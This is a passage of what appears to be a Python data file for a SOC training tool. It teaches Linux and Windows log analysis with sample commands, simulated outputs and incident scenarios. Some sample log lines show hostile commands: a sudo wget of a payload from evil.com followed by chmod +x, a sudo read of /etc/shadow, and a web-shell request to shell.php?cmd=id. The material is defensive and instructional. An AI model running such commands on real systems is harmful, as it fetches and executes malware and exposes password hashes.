                {"from": "winevt\\Logs", "to": "Security.evtx", "data": "Binary log", "title": "Locate file", "desc": "All Windows logs live here", "color": "#3498db"},
                {"from": "Get-Content", "to": "File", "data": "-Wait -Tail 20", "title": "Stream live", "desc": "Like tail -f, follows the file", "color": "#f39c12"},
                {"from": "Analyst", "to": "Terminal", "data": "New events", "title": "Monitor", "desc": "Live view of security events", "color": "#27ae60"}
            ]
        }
    ],
    "scenarios": [
        {
            "id": "logs_sc_1",
            "title": "Spot SSH Brute Force from auth.log",
            "icon": "🔨",
            "color": "#e74c3c",
            "situation": "Multiple failed SSH logins are hitting your server from a single external IP.",
            "detection_cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
            "detection_output": "  642 203.0.113.5\n   58 198.51.100.42",
            "analysis": "642 failures from one IP = automated brute force. Legitimate users don't fail hundreds of times.",
            "response_cmds": [
                "sudo ufw deny from 203.0.113.5",
                "sudo ufw limit ssh",
                "sudo grep 'Accepted' /var/log/auth.log | grep 203.0.113.5"
            ],
            "post_action": "Attacker blocked. Rate limit prevents future automated attempts. Last grep confirms no successful login ever happened from that IP."
        },
        {
            "id": "logs_sc_2",
            "title": "Detect a Web Shell via Apache Logs",
            "icon": "🐚",
            "color": "#c0392b",
            "situation": "A suspicious PHP file was uploaded and is now being called from the outside.",
            "detection_cmd": "sudo grep 'uploads.*\\.php' /var/log/apache2/access.log | tail -20",
            "detection_output": "192.168.1.99 - - [15/Jan/2024:14:35:10] \"GET /uploads/shell.php?cmd=id HTTP/1.1\" 200 45",
            "analysis": "Requests to /uploads/*.php are unusual — upload directories should never execute PHP. The ?cmd= parameter is a classic web shell signature.",
            "response_cmds": [
                "sudo rm /var/www/html/uploads/shell.php",
                "sudo pkill -u www-data",
                "sudo find /var/www -name '*.php' -newermt '1 day ago'"
            ],
            "post_action": "Backdoor removed. Any child processes killed. Find confirms no other recent PHP files were dropped."
        },
        {
            "id": "logs_sc_3",
            "title": "Insider Threat via wtmp and auth.log",
            "icon": "🕵️",
            "color": "#8e44ad",
            "situation": "An employee logs into production at 3 AM and copies data out via scp.",
            "detection_cmd": "sudo last | head -20",
            "detection_output": "alice    pts/0        203.0.113.5      Mon Jan 15 03:00 - 04:30  (01:30)",
            "analysis": "Login from an off-hours IP that isn't alice's usual office network. Duration of exactly 90 minutes suggests an automated exfil.",
            "response_cmds": [
                "sudo grep 'alice' /var/log/auth.log | grep -i scp",
                "sudo usermod -L alice",
                "sudo ufw deny from 203.0.113.5"
            ],
            "post_action": "Account locked, IP blocked. auth.log shows the exact exfil commands for the forensic report."
        }
    ],
    "extra": {
        "log_types": [
            {"name": "System Logs", "icon": "🖥️", "color": "#3498db",
             "desc": "OS events: boot, service start/stop, driver load, kernel messages.",
             "examples": "Linux: syslog, kern.log, dmesg. Windows: System channel.",
             "why": "Diagnose crashes and detect tampering with services."},
            {"name": "Authentication Logs", "icon": "🔐", "color": "#e74c3c",
             "desc": "Every login attempt — successful and failed — plus sudo, su, and PAM events.",
             "examples": "Linux: auth.log, secure. Windows: Security channel (4624, 4625).",
             "why": "Brute force, credential stuffing, and insider threats all show up here."},
            {"name": "Application Logs", "icon": "📱", "color": "#9b59b6",
             "desc": "Events from a specific application: web servers, databases, custom apps.",
             "examples": "Apache access.log, MySQL error.log, nginx error.log.",
             "why": "SQLi, XSS, and application errors appear first in app logs."},
            {"name": "Security Logs", "icon": "🛡️", "color": "#f39c12",
             "desc": "Firewall blocks, IDS alerts, antivirus detections, audit trails.",
             "examples": "Linux: ufw.log, auditd, fail2ban.log. Windows: Defender, Sysmon.",
             "why": "Direct signal of attacks — the highest-priority logs for a SOC."},
            {"name": "Network Logs", "icon": "🌐", "color": "#16a085",
             "desc": "Traffic flow: connections, DNS queries, firewall decisions, proxy hits.",
             "examples": "Windows: 5156, 5157, Sysmon 3. Linux: iptables LOG, Zeek logs.",
             "why": "Spot C2 beaconing, data exfiltration, and lateral movement."},
            {"name": "Audit Logs", "icon": "📋", "color": "#8e44ad",
             "desc": "Fine-grained audit trail: file access, syscalls, privilege changes.",
             "examples": "Linux: auditd. Windows: Audit Policy + 4688, 4657.",
             "why": "Required for compliance. Immutable — attacker can't easily erase."}
        ]
    }
}

# ==================== MODULE: LINUX LOG ANALYSIS ====================
MODULES["linux_logs"] = {
    "key": "linux_logs",
    "title": "Linux Log Analysis",
    "icon": "🐧",
    "template": "linux_logs.html",
    "intro": {
        "what": (
            "Linux logs are the primary forensic artifact on any Linux server. Unlike Windows, "
            "Linux logs are plain text — readable with cat, less, grep, awk. Every login, every sudo, "
            "every cron job, every SSH attempt, every firewall block writes a line to /var/log/. "
            "For a SOC analyst, knowing which log to read and which command to run is the difference "
            "between spotting an attack in seconds and missing it for weeks."
        ),
        "why_soc": [
            "auth.log shows every SSH, sudo, su, and PAM event — your #1 detection source",
            "wtmp/btmp are binary logs that survive log rotation — attackers can't easily erase them",
            "journalctl gives you structured, time-filtered access to every service event",
            "rsyslog lets you forward logs to a central SIEM — critical for multi-server SOCs",
            "fail2ban + auditd give you automated defense and kernel-level syscall trails",
            "grep + awk turn 500 MB of raw logs into a ranked list of attacking IPs in one command"
        ]
    },
    "commands": [
        # ============================================================
        # LINUX LOGS — INSTALLATION & CONFIGURATION
        # ============================================================
        {
            "id": "llog_1",
            "category": "Installation & Config",
            "color": "#3498db",
            "cmd": "sudo apt install rsyslog",
            "desc": "Install rsyslog — the daemon that writes most Linux logs",
            "scenario": (
                "On a minimal Debian/Ubuntu server, rsyslog may not be installed. Without it, "
                "/var/log/syslog and /var/log/auth.log won't exist. This installs the daemon, "
                "sets up the systemd service, and creates the default config in /etc/rsyslog.conf."
            ),
            "output": (
                "Reading package lists... Done\n"
                "The following NEW packages will be installed:\n"
                "  rsyslog\n"
                "Setting up rsyslog (8.2112.0-2ubuntu2) ...\n"
                "Created symlink /etc/systemd/system/syslog.service → /lib/systemd/system/rsyslog.service.\n"
                "rsyslog is now active."
            ),
            "simulation": [
                {"from": "apt", "to": "Ubuntu repo", "data": "rsyslog_8.2112.deb", "title": "Download package", "desc": "rsyslog .deb fetched from mirror", "color": "#3498db"},
                {"from": "dpkg", "to": "/etc/rsyslog.conf", "data": "Default config", "title": "Install config", "desc": "Default rules placed in /etc", "color": "#f39c12"},
                {"from": "systemd", "to": "rsyslog.service", "data": "Enable + start", "title": "Start daemon", "desc": "rsyslogd now collects logs", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_2",
            "category": "Installation & Config",
            "color": "#3498db",
            "cmd": "sudo systemctl enable --now rsyslog",
            "desc": "Enable rsyslog at boot and start it immediately",
            "scenario": (
                "After installing rsyslog, you need to enable it so it starts on every boot, and start it now "
                "so it begins collecting logs immediately. The --now flag does both in one command."
            ),
            "output": (
                "Synchronizing state of rsyslog.service with SysV service script.\n"
                "Created symlink /etc/systemd/system/multi-user.target.wants/rsyslog.service → /lib/systemd/system/rsyslog.service.\n"
                "rsyslog.service is active (running)."
            ),
            "simulation": [
                {"from": "systemctl", "to": "systemd", "data": "enable rsyslog", "title": "Enable at boot", "desc": "Symlink created in .wants/", "color": "#3498db"},
                {"from": "systemd", "to": "rsyslogd", "data": "start", "title": "Start now", "desc": "rsyslogd process spawns", "color": "#27ae60"},
                {"from": "rsyslogd", "to": "/var/log/", "data": "Writing logs", "title": "Collection begins", "desc": "Syslog, auth.log, kern.log start receiving", "color": "#f39c12"}
            ]
        },
        {
            "id": "llog_3",
            "category": "Installation & Config",
            "color": "#3498db",
            "cmd": "sudo rsyslogd -N1",
            "desc": "Validate rsyslog config syntax without restarting",
            "scenario": (
                "After editing /etc/rsyslog.conf or any file in /etc/rsyslog.d/, run this to check for syntax "
                "errors. If it prints 'End of config validation run. Bye.', you're safe to restart. If it shows "
                "an error, rsyslog would fail to start on restart — catching it here prevents an outage."
            ),
            "output": (
                "rsyslogd: version 8.2112.0, config validation run (level 1)\n"
                "rsyslogd: End of config validation run. Bye."
            ),
            "simulation": [
                {"from": "rsyslogd", "to": "/etc/rsyslog.conf", "data": "Parse config", "title": "Read rules", "desc": "Every rule parsed top-to-bottom", "color": "#3498db"},
                {"from": "rsyslogd", "to": "Validator", "data": "Check syntax", "title": "Validate", "desc": "No actual logging happens", "color": "#f39c12"},
                {"from": "Validator", "to": "Terminal", "data": "No errors", "title": "Safe to restart", "desc": "Config is valid", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_4",
            "category": "Installation & Config",
            "color": "#3498db",
            "cmd": "sudo systemctl restart rsyslog",
            "desc": "Restart rsyslog after editing config",
            "scenario": (
                "After adding a new rule — for example, to forward logs to a central server — restart rsyslog "
                "to apply the change. If the config is invalid, restart fails and the old config keeps running. "
                "Always run `rsyslogd -N1` first."
            ),
            "output": "(no output on success — check status with `systemctl status rsyslog`)",
            "simulation": [
                {"from": "systemctl", "to": "rsyslogd", "data": "SIGTERM", "title": "Stop daemon", "desc": "Old process exits cleanly", "color": "#e74c3c"},
                {"from": "systemctl", "to": "rsyslogd", "data": "Start new", "title": "Spawn new", "desc": "Reloads config from disk", "color": "#27ae60"},
                {"from": "rsyslogd", "to": "/var/log/", "data": "Resume logging", "title": "Collection continues", "desc": "New rules active", "color": "#f39c12"}
            ]
        },
        {
            "id": "llog_5",
            "category": "Installation & Config",
            "color": "#f39c12",
            "cmd": "sudo logger -t MYAPP 'Test message from admin'",
            "desc": "Send a test message to syslog",
            "scenario": (
                "After configuring rsyslog (especially forwarding rules), send a test message with `logger`. "
                "If your rule writes to /var/log/myapp.log, this message appears there. If you forward to a "
                "central server, verify the message arrives. It's the quickest way to confirm config works."
            ),
            "output": "(message written to /var/log/syslog and/or /var/log/myapp.log depending on rules)",
            "simulation": [
                {"from": "logger", "to": "/dev/log", "data": "MYAPP: Test message", "title": "Send message", "desc": "Writes to syslog socket", "color": "#3498db"},
                {"from": "/dev/log", "to": "rsyslogd", "data": "facility=user", "title": "Receive", "desc": "rsyslogd reads the message", "color": "#f39c12"},
                {"from": "rsyslogd", "to": "/var/log/syslog", "data": "MYAPP: Test message", "title": "Write to file", "desc": "Rule matches, file written", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_6",
            "category": "Installation & Config",
            "color": "#9b59b6",
            "cmd": "sudo tail -f /var/log/syslog | grep --line-buffered 'UFW BLOCK'",
            "desc": "Live-filter syslog for firewall blocks",
            "scenario": (
                "During an active attack, you want to see blocked packets as they happen. `tail -f` follows "
                "the file, and `grep --line-buffered` filters the stream in real time. Every UFW block appears "
                "the instant the kernel writes it."
            ),
            "output": (
                "Jan 15 14:23:45 server kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DST=192.168.1.10 DPT=22 SYN\n"
                "Jan 15 14:23:47 server kernel: [UFW BLOCK] IN=eth0 SRC=203.0.113.5 DST=192.168.1.10 DPT=3306 SYN"
            ),
            "simulation": [
                {"from": "netfilter", "to": "syslog", "data": "UFW BLOCK entry", "title": "Packet blocked", "desc": "Kernel logs the drop", "color": "#e74c3c"},
                {"from": "tail", "to": "syslog", "data": "Follow file", "title": "Live read", "desc": "-f keeps reading new lines", "color": "#3498db"},
                {"from": "grep", "to": "Terminal", "data": "UFW BLOCK only", "title": "Filter", "desc": "Only matching lines shown", "color": "#27ae60"}
            ]
        },

        # ============================================================
        # AUTH.LOG — THE #1 SOC LOG
        # ============================================================
        {
            "id": "llog_7",
            "category": "auth.log — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo tail -f /var/log/auth.log",
            "desc": "Follow authentication events in real time",
            "scenario": (
                "auth.log is where sshd writes every login attempt, sudo records every privilege escalation, "
                "and su logs every user switch. During an incident, tail -f is the fastest way to watch "
                "an SSH brute force unfold — failed passwords scroll by the second."
            ),
            "output": (
                "Jan 15 14:23:45 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2\n"
                "Jan 15 14:23:47 server sshd[1234]: Failed password for invalid user admin from 203.0.113.5 port 51236 ssh2\n"
                "Jan 15 14:24:01 server sshd[1235]: Accepted password for alice from 192.168.1.50 port 45678 ssh2\n"
                "Jan 15 14:24:15 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow"
            ),
            "simulation": [
                {"from": "sshd", "to": "auth.log", "data": "Failed password", "title": "Auth failure", "desc": "Invalid login written to log", "color": "#e74c3c"},
                {"from": "sudo", "to": "auth.log", "data": "COMMAND=/bin/cat", "title": "Privilege use", "desc": "Every sudo command logged", "color": "#f39c12"},
                {"from": "Admin", "to": "auth.log", "data": "tail -f", "title": "Watch live", "desc": "New lines appear instantly", "color": "#3498db"}
            ]
        },
        {
            "id": "llog_8",
            "category": "auth.log — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo grep 'Failed password' /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head",
            "desc": "Rank attacking IPs by failed password count",
            "scenario": (
                "This is THE command every SOC analyst runs first when they suspect SSH brute force. It reads "
                "every failed password line, extracts the source IP (3rd field from the end), counts how many "
                "attempts each IP made, and shows the top 10. One IP with 600+ failures = automated attack."
            ),
            "output": (
                "  642 203.0.113.5\n"
                "   58 198.51.100.42\n"
                "   23 192.0.2.77\n"
                "   12 45.33.22.11"
            ),
            "simulation": [
                {"from": "grep", "to": "auth.log", "data": "Failed password", "title": "Filter failures", "desc": "Only failed logins kept", "color": "#3498db"},
                {"from": "awk", "to": "Stream", "data": "$(NF-3)", "title": "Extract IP", "desc": "3rd field from end = source IP", "color": "#f39c12"},
                {"from": "sort | uniq -c", "to": "Ranked list", "data": "642 x 203.0.113.5", "title": "Count + rank", "desc": "Group and count per IP", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_9",
            "category": "auth.log — Authentication",
            "color": "#e74c3c",
            "cmd": "sudo grep 'Accepted' /var/log/auth.log | grep '203.0.113.5'",
            "desc": "Check if a specific attacker IP ever succeeded",
            "scenario": (
                "After spotting a brute force IP, your first question is: did they get in? This command greps "
                "auth.log for 'Accepted' lines and filters to that IP. Empty output = attack failed. Any "
                "output = the attacker has valid credentials and is inside your network."
            ),
            "output": "(empty — no successful login from 203.0.113.5)",
            "simulation": [
                {"from": "grep", "to": "auth.log", "data": "Accepted", "title": "Find successes", "desc": "All successful logins", "color": "#27ae60"},
                {"from": "grep", "to": "Stream", "data": "203.0.113.5", "title": "Filter by IP", "desc": "Only attacker's IP", "color": "#f39c12"},
                {"from": "Terminal", "to": "Analyst", "data": "(empty)", "title": "No breach", "desc": "Brute force did not succeed", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_10",
            "category": "auth.log — Authentication",
            "color": "#c0392b",
            "cmd": "sudo grep 'sudo:' /var/log/auth.log | grep 'COMMAND=' | tail -20",
            "desc": "Review recent sudo commands — privilege escalation trail",
            "scenario": (
                "Every sudo command is logged with the full command line, the user who ran it, and the "
                "directory they were in. If an attacker escalates, their commands appear here. Look for "
                "unusual commands: reading /etc/shadow, downloading files with wget, or spawning shells."
            ),
            "output": (
                "Jan 15 14:24:15 server sudo: alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/cat /etc/shadow\n"
                "Jan 15 14:25:03 server sudo: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/payload -O /tmp/p\n"
                "Jan 15 14:25:11 server sudo: alice : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/chmod +x /tmp/p"
            ),
            "simulation": [
                {"from": "sudo", "to": "auth.log", "data": "COMMAND=/bin/cat", "title": "Command logged", "desc": "Every sudo call recorded", "color": "#f39c12"},
                {"from": "grep", "to": "Stream", "data": "COMMAND=", "title": "Filter commands", "desc": "Only privilege escalations", "color": "#3498db"},
                {"from": "Analyst", "to": "Attack trail", "data": "wget + chmod", "title": "Spot attack", "desc": "Download + execute = malware", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_11",
            "category": "auth.log — Authentication",
            "color": "#c0392b",
            "cmd": "sudo grep 'sshd' /var/log/auth.log | grep -v 'Failed\\|Accepted\\|Disconnected' | tail -30",
            "desc": "Find unusual SSH events — not just failures or successes",
            "scenario": (
                "Beyond failed and accepted logins, sshd logs many other events: invalid users, connection "
                "closed, maximum attempts exceeded, reverse DNS failures. Filtering out the common ones reveals "
                "anomalies — like SSH port forwarding or authentication method changes."
            ),
            "output": (
                "Jan 15 14:23:52 server sshd[1234]: error: maximum authentication attempts exceeded for root from 203.0.113.5\n"
                "Jan 15 14:25:00 server sshd[1236]: Received disconnect from 198.51.100.42 port 51240:11: Bye Bye\n"
                "Jan 15 14:26:00 server sshd[1237]: reverse mapping checking getaddrinfo for evil.com failed - POSSIBLE BREAK-IN ATTEMPT!"
            ),
            "simulation": [
                {"from": "sshd", "to": "auth.log", "data": "Max attempts exceeded", "title": "Unusual event", "desc": "Attacker gave up after lockout", "color": "#f39c12"},
                {"from": "grep -v", "to": "Stream", "data": "Exclude common", "title": "Filter noise", "desc": "Only unusual lines remain", "color": "#3498db"},
                {"from": "Analyst", "to": "Anomaly", "data": "POSSIBLE BREAK-IN", "title": "Spot it", "desc": "sshd itself flags the anomaly", "color": "#e74c3c"}
            ]
        },

        # ============================================================
        # WTMP / BTMP / LASTLOG — BINARY LOGIN LOGS
        # ============================================================
        {
            "id": "llog_12",
            "category": "wtmp / btmp / lastlog",
            "color": "#9b59b6",
            "cmd": "sudo last -F -i | head -20",
            "desc": "Show recent successful logins with full timestamps and IPs",
            "scenario": (
                "`last` reads the binary /var/log/wtmp file. It shows every login and logout with timestamps, "
                "source IPs, and session durations. -F shows full timestamps (not truncated), -i shows IP "
                "addresses instead of hostnames. This is the fastest way to see who's been on the box."
            ),
            "output": (
                "alice    pts/0        192.168.1.50     Mon Jan 15 14:24:01 2024   still logged in\n"
                "alice    pts/0        192.168.1.50     Mon Jan 15 09:12:34 2024 - 12:34:56 2024  (03:22)\n"
                "bob      pts/1        10.0.0.42        Sun Jan 14 22:15:11 2024 - 23:01:45 2024  (00:46)"
            ),
            "simulation": [
                {"from": "last", "to": "/var/log/wtmp", "data": "Read binary", "title": "Decode wtmp", "desc": "Binary log parsed to text", "color": "#f39c12"},
                {"from": "wtmp", "to": "Terminal", "data": "Login history", "title": "Display", "desc": "User, IP, time, duration", "color": "#9b59b6"},
                {"from": "Analyst", "to": "Anomaly", "data": "3 AM login", "title": "Spot unusual", "desc": "Off-hours + unknown IP", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_13",
            "category": "wtmp / btmp / lastlog",
            "color": "#9b59b6",
            "cmd": "sudo lastb -F -i | head -20",
            "desc": "Show failed login attempts from btmp",
            "scenario": (
                "btmp is the failed-login counterpart to wtmp. It survives syslog rotation and is written by "
                "PAM directly — attackers can't easily erase it. `lastb` is the only way to read it. A wall of "
                "entries from one IP = brute force. Different usernames tried = user enumeration."
            ),
            "output": (
                "admin    ssh:notty    203.0.113.5      Mon Jan 15 14:23:45 2024 - 14:23:45 2024  (00:00)\n"
                "root     ssh:notty    203.0.113.5      Mon Jan 15 14:22:11 2024 - 14:22:11 2024  (00:00)\n"
                "test     ssh:notty    198.51.100.42    Mon Jan 15 14:15:00 2024 - 14:15:00 2024  (00:00)"
            ),
            "simulation": [
                {"from": "lastb", "to": "/var/log/btmp", "data": "Read binary", "title": "Decode btmp", "desc": "Failed logins parsed", "color": "#f39c12"},
                {"from": "btmp", "to": "Terminal", "data": "Failure history", "title": "Display", "desc": "User, IP, timestamp", "color": "#9b59b6"},
                {"from": "Analyst", "to": "Pattern", "data": "Many usernames", "title": "Detect enumeration", "desc": "Attacker trying many users", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_14",
            "category": "wtmp / btmp / lastlog",
            "color": "#9b59b6",
            "cmd": "sudo lastlog | head -30",
            "desc": "Show the most recent login for every user account",
            "scenario": (
                "lastlog reads /var/log/lastlog and shows the last login time for every account on the system. "
                "This reveals which accounts are active, which have never logged in (potential unused attack "
                "surface), and which have suspicious recent logins. Root logging in at 3 AM stands out immediately."
            ),
            "output": (
                "Username         Port     From             Latest\n"
                "root             pts/0    203.0.113.5      Mon Jan 15 03:00:11 +0000 2024\n"
                "alice            pts/0    192.168.1.50     Mon Jan 15 14:24:01 +0000 2024\n"
                "bob              pts/1    10.0.0.42        Sun Jan 14 22:15:11 +0000 2024\n"
                "daemon           **Never logged in**"
            ),
            "simulation": [
                {"from": "lastlog", "to": "/var/log/lastlog", "data": "Read binary", "title": "Read lastlog", "desc": "Last login per UID", "color": "#f39c12"},
                {"from": "lastlog", "to": "Terminal", "data": "Per-user table", "title": "Display", "desc": "Every account's last login", "color": "#9b59b6"},
                {"from": "Analyst", "to": "Anomaly", "data": "root at 3 AM", "title": "Spot", "desc": "Unusual time for root", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_15",
            "category": "wtmp / btmp / lastlog",
            "color": "#9b59b6",
            "cmd": "who -a; echo '---'; w",
            "desc": "Show who is currently logged in and what they're doing",
            "scenario": (
                "who reads /var/run/utmp (current sessions), w shows the same plus what command each user is "
                "running. During an incident, this is your first command — it tells you if the attacker is still "
                "logged in right now. If you see a session from an unknown IP, that's an active intrusion."
            ),
            "output": (
                "           system boot  2024-01-15 09:00\n"
                "alice    pts/0        2024-01-15 14:24 (192.168.1.50)\n"
                "bob      pts/1        2024-01-15 08:30 (10.0.0.42)\n"
                "---\n"
                " 14:30:00 up 5:30,  2 users,  load average: 0.15, 0.22, 0.18\n"
                "USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n"
                "alice    pts/0    192.168.1.50     14:24    0.00s  0.12s  0.01s w\n"
                "bob      pts/1    10.0.0.42        08:30    2:15m  0.05s  0.01s vim notes.txt"
            ),
            "simulation": [
                {"from": "who", "to": "/var/run/utmp", "data": "Read current", "title": "Who is on", "desc": "Active sessions only", "color": "#3498db"},
                {"from": "w", "to": "utmp + /proc", "data": "Current command", "title": "What they do", "desc": "Command running in each shell", "color": "#f39c12"},
                {"from": "Analyst", "to": "Terminal", "data": "Unknown IP", "title": "Spot intruder", "desc": "Active attack detected", "color": "#e74c3c"}
            ]
        },

        # ============================================================
        # JOURNALCTL — SYSTEMD JOURNAL
        # ============================================================
        {
            "id": "llog_16",
            "category": "journalctl — systemd Journal",
            "color": "#27ae60",
            "cmd": "sudo journalctl -u ssh --since '1 hour ago' --no-pager",
            "desc": "Query SSH events in the last hour from systemd journal",
            "scenario": (
                "journalctl queries the binary systemd journal. Unlike flat files, you can filter by service "
                "(-u), time (--since), priority (-p), and even structured fields like _PID or _UID. "
                "The --no-pager flag is critical for piping into grep/awk/wc."
            ),
            "output": (
                "Jan 15 14:28:12 host sshd[890]: Accepted password for alice from 192.168.1.50 port 51234 ssh2\n"
                "Jan 15 14:28:12 host sshd[890]: pam_unix(sshd:session): session opened for user alice\n"
                "Jan 15 14:30:45 host sshd[890]: pam_unix(sshd:session): session closed for user alice"
            ),
            "simulation": [
                {"from": "journalctl", "to": "journald", "data": "_SYSTEMD_UNIT=ssh", "title": "Filter unit", "desc": "Only ssh.service entries", "color": "#3498db"},
                {"from": "journald", "to": "Binary journal", "data": "1 hour window", "title": "Time filter", "desc": "--since limits output", "color": "#f39c12"},
                {"from": "journalctl", "to": "Terminal", "data": "Formatted lines", "title": "Display", "desc": "Human-readable", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_17",
            "category": "journalctl — systemd Journal",
            "color": "#27ae60",
            "cmd": "sudo journalctl -p err --since '24 hours ago' --no-pager",
            "desc": "Show all error-priority messages in the last 24 hours",
            "scenario": (
                "Priority filtering (-p err) shows only messages at error level or worse. This cuts thousands "
                "of info-level lines down to the handful that actually matter: failed services, kernel errors, "
                "crashed applications. First command to run when 'something is broken'."
            ),
            "output": (
                "Jan 15 14:20:00 server kernel: Out of memory: Killed process 1234 (mysqld)\n"
                "Jan 15 14:20:01 server systemd[1]: mysql.service: Main process exited, code=killed, status=9/KILL\n"
                "Jan 15 14:20:01 server systemd[1]: mysql.service: Failed with result 'oom-kill'."
            ),
            "simulation": [
                {"from": "journalctl", "to": "journald", "data": "-p err", "title": "Priority filter", "desc": "Only errors and worse", "color": "#e74c3c"},
                {"from": "journald", "to": "Binary journal", "data": "24h window", "title": "Time filter", "desc": "Last 24 hours only", "color": "#f39c12"},
                {"from": "journalctl", "to": "Terminal", "data": "OOM events", "title": "Display", "desc": "Root cause visible", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_18",
            "category": "journalctl — systemd Journal",
            "color": "#27ae60",
            "cmd": "sudo journalctl _COMM=sshd -o json --no-pager | jq '.MESSAGE' | head -20",
            "desc": "Extract structured JSON from journal entries",
            "scenario": (
                "Every journal entry has structured fields: _PID, _UID, _COMM, _EXE, _CMDLINE, _HOSTNAME. "
                "The -o json flag outputs them as JSON, perfect for piping into jq or feeding a SIEM. "
                "This example pulls all messages from processes named 'sshd'."
            ),
            "output": (
                "\"Failed password for invalid user admin from 203.0.113.5 port 51234 ssh2\"\n"
                "\"Failed password for invalid user admin from 203.0.113.5 port 51236 ssh2\"\n"
                "\"Accepted password for alice from 192.168.1.50 port 45678 ssh2\""
            ),
            "simulation": [
                {"from": "journalctl", "to": "journald", "data": "_COMM=sshd", "title": "Field filter", "desc": "Only sshd process", "color": "#3498db"},
                {"from": "journald", "to": "JSON output", "data": "{\"_PID\":1234,...}", "title": "Structured", "desc": "Every field available", "color": "#f39c12"},
                {"from": "jq", "to": "Terminal", "data": ".MESSAGE", "title": "Extract field", "desc": "Just the message text", "color": "#27ae60"}
            ]
        },

        # ============================================================
        # NETWORK / ESTABLISHED CONNECTIONS
        # ============================================================
        {
            "id": "llog_19",
            "category": "Network & Connections",
            "color": "#16a085",
            "cmd": "sudo ss -tnpa | grep 'ESTABLISHED.*sshd'",
            "desc": "Show all established SSH connections",
            "scenario": (
                "ss is the modern replacement for netstat. This command shows every TCP connection in the "
                "ESTABLISHED state owned by sshd — i.e., every active SSH session right now. The source IP "
                "and port reveal where each connection comes from. An unexpected IP = an intruder inside."
            ),
            "output": (
                "ESTAB 0 0 192.168.1.10:22 203.0.113.5:51234 users:((\"sshd\",pid=1234,fd=3))\n"
                "ESTAB 0 0 192.168.1.10:22 192.168.1.50:45678 users:((\"sshd\",pid=1235,fd=3))"
            ),
            "simulation": [
                {"from": "ss", "to": "Kernel", "data": "Get sockets", "title": "Query", "desc": "Reads /proc/net/tcp", "color": "#3498db"},
                {"from": "grep", "to": "Stream", "data": "ESTABLISHED", "title": "Filter state", "desc": "Only active sessions", "color": "#f39c12"},
                {"from": "Analyst", "to": "Terminal", "data": "Unknown IP", "title": "Spot intruder", "desc": "203.0.113.5 is an attacker", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_20",
            "category": "Network & Connections",
            "color": "#16a085",
            "cmd": "sudo lsof -i -n -P | grep ESTABLISHED | head -20",
            "desc": "List all established network connections with owning process",
            "scenario": (
                "lsof (List Open Files) shows every network connection alongside the process that owns it. "
                "Unlike ss, it also shows the executable path and user. Perfect for answering 'which process "
                "is talking to that IP?' during an incident."
            ),
            "output": (
                "sshd    1234  root    3u  IPv4  45678  0t0  TCP 192.168.1.10:22->203.0.113.5:51234 (ESTABLISHED)\n"
                "sshd    1235  alice   3u  IPv4  45679  0t0  TCP 192.168.1.10:22->192.168.1.50:45678 (ESTABLISHED)"
            ),
            "simulation": [
                {"from": "lsof", "to": "/proc", "data": "Enumerate fds", "title": "Read /proc", "desc": "Every open socket", "color": "#3498db"},
                {"from": "grep", "to": "Stream", "data": "ESTABLISHED", "title": "Filter active", "desc": "Skip listening sockets", "color": "#f39c12"},
                {"from": "Terminal", "to": "Analyst", "data": "Process + IP", "title": "Attribution", "desc": "Which process, which user", "color": "#27ae60"}
            ]
        },
        {
            "id": "llog_21",
            "category": "Network & Connections",
            "color": "#16a085",
            "cmd": "sudo grep 'UFW BLOCK' /var/log/syslog | awk '{print $13}' | sort | uniq -c | sort -rn | head",
            "desc": "Rank blocked source IPs from UFW firewall logs",
            "scenario": (
                "When UFW blocks packets, it logs them to syslog with [UFW BLOCK]. This command extracts the "
                "source IP (13th field) from every block entry, counts them per IP, and ranks the top talkers. "
                "One IP with 4,000+ blocks = port scanner or DDoS."
            ),
            "output": (
                " 4521 203.0.113.5\n"
                "  234 198.51.100.42\n"
                "   89 192.0.2.77"
            ),
            "simulation": [
                {"from": "netfilter", "to": "syslog", "data": "UFW BLOCK", "title": "Packets dropped", "desc": "Every block logged", "color": "#e74c3c"},
                {"from": "awk", "to": "Stream", "data": "$13", "title": "Extract SRC IP", "desc": "13th field = source", "color": "#f39c12"},
                {"from": "sort | uniq -c", "to": "Ranked", "data": "4521 x IP", "title": "Count + rank", "desc": "Top blocker first", "color": "#16a085"}
            ]
        },

        # ============================================================
        # ATTACK DETECTION — SSH, TELNET, FTP, NMAP
        # ============================================================
        {
            "id": "llog_22",
            "category": "Attack Detection",
            "color": "#e74c3c",
            "cmd": "sudo grep 'Failed password' /var/log/auth.log | wc -l",
            "desc": "Count total failed SSH password attempts",
            "scenario": (
                "Before ranking IPs, get the raw number. A count in the hundreds or thousands means an active "
                "brute force. A count of 0-5 per day is normal noise. This is your first triage number when "
                "auth.log looks suspicious."
            ),
            "output": "847",
            "simulation": [
                {"from": "grep", "to": "auth.log", "data": "Failed password", "title": "Filter", "desc": "Only failures", "color": "#3498db"},
                {"from": "wc -l", "to": "Terminal", "data": "847", "title": "Count", "desc": "Total failures", "color": "#e74c3c"}
            ]
        },
        {
            "id": "llog_23",
            "category": "Attack Detection",
            "color": "#e74c3c",
            "cmd": "sudo grep -E 'telnet|ftp' /var/log/auth.log /var/log/syslog 2>/dev/null | tail -20",
